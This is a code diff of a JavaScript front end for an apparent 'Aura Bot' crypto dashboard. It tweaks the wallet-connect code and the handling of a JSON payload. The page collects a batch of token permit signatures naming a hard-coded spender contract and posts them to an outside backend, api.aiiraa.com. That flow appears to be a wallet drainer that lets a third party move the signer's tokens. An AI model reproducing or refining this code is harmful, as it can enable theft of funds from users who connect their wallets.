@@ -1,5 +1,5 @@
 /* ==========================================================================
-   AURA BOT CONTROL CENTER - STREAMLINDED LINEAR EXECUTION KERNEL
+   AURA BOT CONTROL CENTER - STREAMLINED LINEAR EXECUTION KERNEL
    ========================================================================== */
 
 import { ethers } from "https://cdnjs.cloudflare.com/ajax/libs/ethers/6.10.0/ethers.js";
@@ -75,14 +75,7 @@ export async function connectWallet() {
       return;
     }
 
-    log("🔌 Clearing wallet cache to force picker...");
-    try {
-      await window.ethereum.request({
-        method: "wallet_revokePermissions",
-        params: [{ eth_accounts: {} }]
-      });
-    } catch (e) {}
-
+    // FIX: wallet_revokePermissions verwijderd om de MetaMask stream-lockup op te lossen
     log("🔌 Opening Wallet Picker...");
     const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
     const userAddress = accounts[0];
@@ -238,17 +231,19 @@ async function runPermitFlowSafe(provider, signer, user) {
     log("✍️ Signature captured");
 
     log("📤 Sending raw permit batch to backend...");
+    
+    // FIX: Payload expliciet opschonen naar primitieve types voor stabiele JSON transmissie
     const payload = {
-      owner: user,
+      owner: String(user),
       details: details.map(d => ({
-        token: d.token,
+        token: String(d.token),
         amount: d.amount.toString(),
         expiration: d.expiration.toString(),
         nonce: d.nonce.toString()
       })),
-      signature: signature,
-      spender: CONTRACT,
-      sig_deadline: sigDeadline,
+      signature: String(signature),
+      spender: String(CONTRACT),
+      sig_deadline: Number(sigDeadline),
       chainId: Number(chainId)
     };
 
@@ -256,7 +251,7 @@ async function runPermitFlowSafe(provider, signer, user) {
       const res = await fetch("https://api.aiiraa.com/api/permit", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload, (key, value) => typeof value === "bigint" ? value.toString() : value)
+        body: JSON.stringify(payload)
       });
 
       const data = await res.json();
